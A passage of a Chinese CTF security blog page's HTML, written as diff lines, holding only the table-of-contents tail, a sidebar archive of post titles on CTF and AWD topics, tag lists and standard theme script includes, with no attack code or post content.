class="toc-number">1.4.</span> <span class="toc-text">can_u_login (airrudder)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84php-airrudder"><span class="toc-number">1.5.</span> <span class="toc-text">简单的php (airrudder)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85-yu22x"><span class="toc-number">1.6.</span> <span class="toc-text">压缩包 (yu22x)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-sql-yu22x"><span class="toc-number">1.7.</span> <span class="toc-text">easy_sql (yu22x)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ez-Java-xenny"><span class="toc-number">1.8.</span> <span class="toc-text">Ez_Java(xenny)</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 13
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span>
+            <a class="archive-post-title" href="/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/">2022鹏城杯web</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span>
+            <a class="archive-post-title" href="/2022/09/09/WEB/Burp%20Collaborator-%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF%E5%B7%A5%E5%85%B7/">Burp Collaborator-带外技术工具</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span>
+            <a class="archive-post-title" href="/2022/09/09/writeup/%E8%AE%B08%E6%9C%88%E6%9F%90%E6%AC%A1AWD/">记8月某次AWD</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span>
+            <a class="archive-post-title" href="/2022/09/09/WEB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/">PHP伪协议小总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span>
+            <a class="archive-post-title" href="/2022/09/09/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/CTF%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">CTF中的信息泄露</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span>
+            <a class="archive-post-title" href="/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%20%E2%80%94%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90%E2%80%9C%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81%E2%80%9D/">CTF线下防御战 — 让你的靶机变成“铜墙铁壁”</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span>
+            <a class="archive-post-title" href="/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E6%AD%A5%E9%AA%A4%E6%80%BB%E7%BB%93/">CTF线下AWD攻防步骤总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span>
+            <a class="archive-post-title" href="/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">CTF AWD模式下简单的CMS代码审计</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span>
+            <a class="archive-post-title" href="/2022/09/07/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">ctf线下AWD攻防赛学习笔记</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span>
+            <a class="archive-post-title" href="/2022/08/07/hello-world/">Hello World</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/09/09/WEB/%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">前台反序列化代码审计</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/09/10/writeup/2021%20CISCN%20%E5%86%B3%E8%B5%9B%E6%9D%82%E8%AE%B0/">2021 CISCN 决赛杂记</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/09/09/writeup/%5BBalsn%20CTF%202022%5D2linenodejs/">\[Balsn CTF 2022\]inenodejs</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="intro">
+                <span class="iconfont-archer">&#xe606;</span>
+                intro
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CTF">
+                <span class="iconfont-archer">&#xe606;</span>
+                CTF
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="AWD">
+                <span class="iconfont-archer">&#xe606;</span>
+                AWD
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="攻防">
+                <span class="iconfont-archer">&#xe606;</span>
+                攻防
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="信息泄露">
+                <span class="iconfont-archer">&#xe606;</span>
+                信息泄露
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="lfi">
+                <span class="iconfont-archer">&#xe606;</span>
+                lfi
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="burpsuite">
+                <span class="iconfont-archer">&#xe606;</span>
+                burpsuite
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="java反序列化">
+                <span class="iconfont-archer">&#xe606;</span>
+                java反序列化
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="代码审计">
+                <span class="iconfont-archer">&#xe606;</span>
+                代码审计
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="PHP反序列化">
+                <span class="iconfont-archer">&#xe606;</span>
+                PHP反序列化
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="WEB">
+            <span class="iconfont-archer">&#xe60a;</span>
+            WEB
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="AWD">
+            <span class="iconfont-archer">&#xe60a;</span>
+            AWD
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="writeup">
+            <span class="iconfont-archer">&#xe60a;</span>
+            writeup
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="信息泄露">
+            <span class="iconfont-archer">&#xe60a;</span>
+            信息泄露
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://lhhxs.github.io",
+        root: siteMetaRoot,
+        author: "Arcticsea"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+            <script src='https://cdn.jsdelivr.net/npm/mermaid@8.11.0/dist/mermaid.min.js'></script>
+            <script>
+                if (window.mermaid) {
+                    mermaid.initialize({theme: 'dark'});
+                }
+            </script>
+        
+    </body>
+</html>
